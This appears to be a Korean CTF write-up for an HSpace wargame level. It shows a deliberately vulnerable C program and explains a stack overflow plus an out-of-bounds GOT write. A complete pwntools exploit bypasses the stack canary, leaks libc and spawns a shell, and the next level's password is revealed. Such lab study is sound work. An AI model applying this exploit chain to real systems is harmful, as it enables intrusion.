https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter07/ch7.c
```
#include <stdio.h>
/*
    HSpace Lord of the BOF
    - got
*/

unsigned long long wire[100];


void startup(){    
    puts("Hope the car starts!");
    char wish[0x100];
    read(0, wish, 0x200);        
}

void menu(){
    puts("1. Re-map ecu");
    puts("2. Start a car");
    puts("3. Die XD");
}

int main(int argc, char *argv[]){
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    puts("Kill switch enabled");
    puts("The car won't start if the kill switch is on");
    while(1){
        int select; 
	menu();
	printf("> ");
        scanf("%d", &select);
        getchar();
        if (select == 1){
            printf("number : ");
            scanf("%d", &select);
            getchar();
            printf("value : ");
            scanf("%llu", &wire[select]);
        }else if (select == 2){
            startup();
        }else{
            puts("Grrrrr....!!!");
            return 1;
        }        
    }
}
```

```
[*] '/home/Wired_at_the_Vault/got'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

코드를 보면 wire 배열이 전역변수로 설정되어 있다. 이는 곧 wire가 bss 영역에 있음을 의미한다.  
그리고 ``startup()`` 함수에서는 크기가 0x100인 배열에 대해 ``read()`` 함수로 0x200만큼 입력을 받으므로 Stack-based Buffer Overflow가 발생한다.  
또한 main에서 1번으로 wire 배열에 검증할 때, 인덱스의 범위에 대한 검사가 누락되어 있다.  
따라서 OOB(Out-of-Bound) 취약점이 발생하고, 이를 통해 GOT 영역과 stdout, stdin의 주소에 값을 쓸 수 있게 된다.  
그러나 Overflow 취약점을 제공해주기 때문에, 거창한 방법 필요없이 단순하게 __stack_chk_fail@GOT를 ``ret``의 주소로 덮어주면  
Canary 검사 과정을 피할 수 있으므로, 이후에는 ROP를 해주면 된다.  

간단히 익스플로잇 과정을 설명하자면 아래와 같다:
1. __stack_chk_fail@GOT를 ``ret`` 주소로 덮기 (OOB write 사용)
2. ROP를 사용해 libc 주소를 유출 후 다시 main으로 복귀
3. __stack_chk_fail@GOT를 다시 ``ret`` 주소로 덮기 (OOB write 사용)
4. ROP를 사용해 ``system("/bin/sh");``을 호출하여 Shell 획득

익스플로잇은 아래와 같다:
```
from pwn import *

p = process('./got')
elf = ELF('./got')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

########################
### Helper Functions ###
########################

def oob_write(idx, value):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"number : ", str(idx).encode())
    p.sendlineafter(b"value : ", str(value).encode())

def overflow(data):
    p.sendlineafter(b"> ", b'2')
    p.sendafter(b"Hope the car starts!\n", data)

####################
### Exploitation ###
####################

ret = 0x40101a
pop_rdi = 0x4011fe

oob_write(-12, ret)

payload = b'A' * 0x110
payload += b'B' * 0x8
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

overflow(payload)

libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']

binsh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols['system']

oob_write(-12, ret)

payload = b'A' * 0x110
payload += b'B' * 0x8
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret) + p64(system)       # Stack Alignment

overflow(payload)

p.interactive()
```

위 익스플로잇을 실행해 Shell을 획득하고 status 명령어를 사용하여 Chapter 8 유저의 PW를 획득한다.

```
[*] Switching to interactive mode
$ status
UID: 508
Chapter8 PW: goat_got_got
■■■□□□□□□□
$
```
